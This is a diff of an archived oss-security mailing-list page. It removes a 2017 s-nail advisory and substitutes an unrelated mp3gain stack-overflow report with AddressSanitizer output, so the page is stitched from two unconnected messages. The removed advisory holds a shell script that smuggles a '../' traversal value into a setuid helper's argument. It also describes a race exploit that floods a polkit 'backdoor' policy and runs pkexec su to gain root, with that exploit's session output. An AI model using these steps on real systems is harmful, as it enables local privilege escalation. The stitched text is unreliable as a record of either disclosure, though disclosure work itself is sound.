@@ -1,120 +1,98 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/02/05/6
-Message-ID: <c227f38a-f873-fbf8-b4bc-220df1b31066@yahoo.fr>
-Date: Sun, 5 Feb 2017 02:01:55 +0100
-From: wapiflapi <wapiflapi@...oo.fr>
-To: oss-security@...ts.openwall.com
-Cc: Steffen Nurpmeso <steffen@...oden.eu>
-Subject: Re: CVE Request: s-nail local root
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/09/14/1
+Message-ID: <919635.76744044-sendEmail@localhost>
+Date: Thu, 14 Sep 2017 06:59:47 +0000
+From: "Agostino Sarubbo" <ago@...too.org>
+To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
+Subject: mp3gain: stack-based buffer overflow in filterYule (gain_analysis.c)
 Content-Type: text/plain; charset=utf-8
 
-Hi,
+Description:
+mp3gain is a program to analyze and adjust MP3 files to same volume.
 
-Still no update on this. If here is not the right place can someone
-please point me to where I should ask for a CVE for this fixed local
-root in s-nail?
+The fuzz was done via the aacgain command-line tool which uses mp3gain.
+The upstream project seems to be dead, so the issue wasn’t communicated to them.
 
-Thanks!
+The complete ASan output of the issue:
 
-On 01/27/2017 10:03 PM, wapiflapi wrote:
-> Hi,
-> 
-> s-nail fixed a local root. This affects archlinux by default and other
-> linux distros' packages (eg. ubuntu). Can we get a CVE for this ?
-> 
-> https://www.mail-archive.com/s-nail-users@lists.sourceforge.net/msg00551.html
-> 
-> Here is the advisory:
-> 
-> Affects
-> =======
-> 
-> S-nail (later S-mailx) is a mail processing system. It is intended to
-> provide the functionality of the POSIX mailx command. It is installed by
-> default on archlinux and is pulled in on ubuntu whenever mailx is
-> needed. It might be used elsewhere.
-> 
-> There is a vulnerability in the setuid root helper binary s-nail uses to
-> handle lock files:
-> 
->   - archlinux: /usr/lib/mail-privsep
->   - ubuntu:    /usr/lib/s-nail/s-nail/privsep
-> 
-> 
-> Reproducing the issue
-> =====================
-> 
-> The problem is that an O_EXCL file is created with a user controlled
-> path because the di.di_hostname and di.di_randstr are never checked.
-> This means that using s-nail-privsep a normal user can create a file
-> anywhere on the filesystem, which is a security problem.
-> 
-> The command is very picky about it's arguments. Here is an example
-> script setting up the bug. This runs the setuid binary under strace so
-> we can see the call to open() that we control followed by a call to
-> fchown() giving us ownership.
-> 
-> 
-> ```
-> # On archlinux it should be: /usr/lib/mail-privsep
-> PRIVSEP=/usr/lib/s-nail/s-nail-privsep;
-> 
-> # Some setup to get the directory traversal working.
-> touch /tmp/foo
-> mkdir -p /tmp/foo.lock.spam.eggs
-> 
-> cd $(dirname $PRIVSEP);
-> PATH=$PATH:. # argv[0] must be just the name.
-> 
-> # stdin & stdout must be pipes !
-> echo | strace -f $(basename $PRIVSEP) rdotlock \
->               mailbox /tmp/foo name /tmp/foo.lock \
->               hostname spam randstr eggs/../../../../../../../tmp/test \
->               pollmsecs 0 |& grep -E "foo\.lock\.spam\.eggs|chown";
-> ```
-> 
-> 
-> Security Impact
-> ===============
-> 
-> This issue can be leveraged by any logged in user to gain full root
-> privileges.
-> 
-> To exploit this we have to win a race condition and find a way to
-> leverage the ephemeral file. We achieve this by adding a polkit policy
-> and using pkexec su.
-> 
-> A functional exploit is attached :-) Should look like this:
-> 
-> ```
-> $ id
-> uid=1000(wapiflapi) gid=1000(wapiflapi) groups=1000(wapiflapi)[...]
-> $ ./s-nail-privget /usr/lib/s-nail/s-nail-privsep
-> [=] s-nail-privsep local root by @wapiflapi
-> [+] Started flood in /usr/share/polkit-1/actions/backdoor.policy
-> [+] Started race with /usr/lib/s-nail/s-nail-privsep
-> [=] This could take a while...
-> [/] wait for it: done
-> root@box:~# id
-> uid=0(root) gid=0(root) groups=0(root)
-> ```
-> 
-> If the system doesn't have pkexec there are other ways to get root
-> access from this. (`at` and `crontab` files come to mind.) The exploit
-> is a bit slow (20s?), it's probably possible to be smarter about the
-> race, but it's a poc ! ;-) Also if testing in a VM, having more than one
-> cpu core helps a lot.
-> 
-> 
-> Issue Timeline
-> ==============
-> 
-> discovery:  26/01/2016
-> disclosure: 27/01/2016
-> vendor fix: 27/01/2016
-> 
-> 
-> Regards,
-> Wannes `wapiflapi` Rombouts
-> 
+# aacgain -f $FILE
+==18941==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7f2d1e9cd520 at pc 0x00000088af27 bp 0x7ffc10f47b20 sp 0x7ffc10f47b18
+READ of size 8 at 0x7f2d1e9cd520 thread T0
+    #0 0x88af26 in filterYule /var/tmp/portage/media-sound/aacgain-1.9/work/aacgain-1.9/mp3gain/gain_analysis.c:195
+    #1 0x88bfcc in AnalyzeSamples /var/tmp/portage/media-sound/aacgain-1.9/work/aacgain-1.9/mp3gain/gain_analysis.c:344
+    #2 0x43e89a in main /var/tmp/portage/media-sound/aacgain-1.9/work/aacgain-1.9/mp3gain/mp3gain.c:2281
+    #3 0x7f2d21465680 in __libc_start_main (/lib64/libc.so.6+0x20680)
+    #4 0x4426c8 in _start (/usr/bin/aacgain+0x4426c8)
+
+Address 0x7f2d1e9cd520 is located in stack of thread T0 at offset 9504 in frame
+    #0 0x4341ff in main /var/tmp/portage/media-sound/aacgain-1.9/work/aacgain-1.9/mp3gain/mp3gain.c:1411
+
+  This frame has 7 object(s):
+    [32, 33) 'maxgain'
+    [96, 97) 'mingain'
+    [160, 164) 'nprocsamp'
+    [224, 232) 'maxsample'
+    [288, 9504) 'lsamples' 0x0fe623d31aa0: 00 00 00 00[f2]f2 f2 f2 00 00 00 00 00 00 00 00
+  0x0fe623d31ab0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0fe623d31ac0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0fe623d31ad0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0fe623d31ae0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0fe623d31af0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Heap right redzone:      fb
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack partial redzone:   f4
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==18941==ABORTING
+
+Affected version:
+1.5.2
+
+Fixed version:
+N/A
+
+Commit fix:
+N/A
+
+Credit:
+This bug was discovered by Agostino Sarubbo of Gentoo.
+
+CVE:
+CVE-2017-14407
+
+Reproducer:
+https://github.com/asarubbo/poc/blob/master/00345-aacgain-stackoverflow-filterYule
+
+Timeline:
+2017-08-28: bug discovered
+2017-09-08: blog post about the issue
+2017-09-13: CVE Assigned
+
+Note:
+This bug was found with American Fuzzy Lop.
+This bug was identified with bare metal servers donated by Packet. This work is also supported by the Core Infrastructure Initiative.
+
+Permalink:
+https://blogs.gentoo.org/ago/2017/09/08/mp3gain-stack-based-buffer-overflow-in-filteryule-gain_analysis-c/
+
+--
+Agostino Sarubbo
+Gentoo Linux Developer
+
 
